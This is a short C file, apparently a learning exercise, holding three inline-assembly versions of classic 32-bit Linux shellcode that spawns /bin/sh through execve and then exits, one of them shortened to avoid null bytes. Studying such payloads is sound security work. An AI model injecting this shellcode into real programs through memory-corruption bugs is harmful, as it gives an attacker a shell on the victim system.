/*void main() {
	__asm__(""
	"jmp	. +	34\n\t"
	"popl	%esi\n\t"
	"movl	$0x0,%edx\n\t"
	"pushl	$0x0\n\t"
	"pushl	%esi\n\t"
	"movl	%esp,%ecx\n\t"
	"movl	%esi,%ebx\n\t"
	"movl	$0xb,%eax\n\t"
	"int	$0x80\n\t"
	
	"movl	$0x0,%ebx\n\t"
	"movl	$0x1,%eax\n\t"
	"int	$0x80\n\t"
	
	"call	. - 0x20\n\t"
	".string	\"/bin/sh\"");
}*/

// shorter version
void main() {
	__asm__(""
	"jmp	. +	24\n\t"
	"popl	%esi\n\t"
	"xorl	%edx,%edx\n\t"
	"pushl	%edx\n\t"
	"pushl	%esi\n\t"
	"movl	%esp,%ecx\n\t"
	"movl	%esi,%ebx\n\t"
	"xorl	%eax,%eax\n\t"
	"movb	$0xb,%al\n\t"
	"int	$0x80\n\t"
	
	"xorl	%ebx,%ebx\n\t"
	"xorl	%eax,%eax\n\t"
	"inc	%eax\n\t"
	"int	$0x80\n\t"
	
	"call	. - 22\n\t"
	".string	\"/bin/sh\"");
}
/*
#include <stdio.h>

void main() {
  __asm__("jmp  . + 44\n\t"
  "popl %esi\n\t"
  "movl %esi,0x8(%esi)\n\t"
  "movb $0x0,0x7(%esi)\n\t"
  "movl $0x0,0xc(%esi)\n\t"
  "movl $0xb,%eax\n\t"
  "movl %esi,%ebx\n\t"
  "leal 0x8(%esi),%ecx\n\t"
  "leal 0xc(%esi),%edx\n\t"
  "int  $0x80\n\t"
  "movl $0x1,%eax\n\t"
  "movl $0x0,%ebx\n\t"
  "int  $0x80\n\t"
  "call . - 42\n\t"
  ".string  \"/bin/sh\"");
}
*/
